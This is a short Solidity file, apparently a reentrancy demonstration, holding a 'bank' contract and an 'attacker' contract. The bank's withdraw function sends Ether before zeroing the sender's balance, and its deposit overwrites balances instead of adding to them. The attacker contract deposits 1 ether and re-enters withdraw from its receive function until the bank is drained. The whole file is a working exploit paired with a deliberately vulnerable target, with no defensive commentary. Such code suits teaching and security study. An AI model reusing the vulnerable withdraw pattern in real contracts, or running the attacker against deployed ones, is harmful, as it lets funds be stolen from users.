// SPDX-License-Identifier: MIT

pragma solidity >=0.8.2 <0.9.0;

contract bank {
    mapping(address => uint256) public balanceOf;

    event Funding(address _addr, uint _val);

    function deposit() payable public {
        require(msg.value >= 1 ether, "msg.value not enough");
        balanceOf[msg.sender] = msg.value;
        emit Funding(msg.sender, msg.value);
    }

    function withdraw() payable public {
        uint bal = balanceOf[msg.sender];
        require(bal > 0);
        (bool success, ) = msg.sender.call{value: bal}("");
        require(success, "failed to send");

        balanceOf[msg.sender] = 0;
    }

    function getBalance() view public returns (uint) {
        return address(this).balance;
    }
}

contract attacker {
    bank bk;

    constructor(address addr) {
        bk = bank(addr);
    }

    function attack() public payable {
        bk.deposit{value: 1 ether}();
        bk.withdraw();
    }

    receive() payable external {
        if (address(bk).balance >= 1 ether) {
            bk.withdraw();
        }
    }

    function getBalance() view public returns(uint) {
        return address(this).balance;
    }
}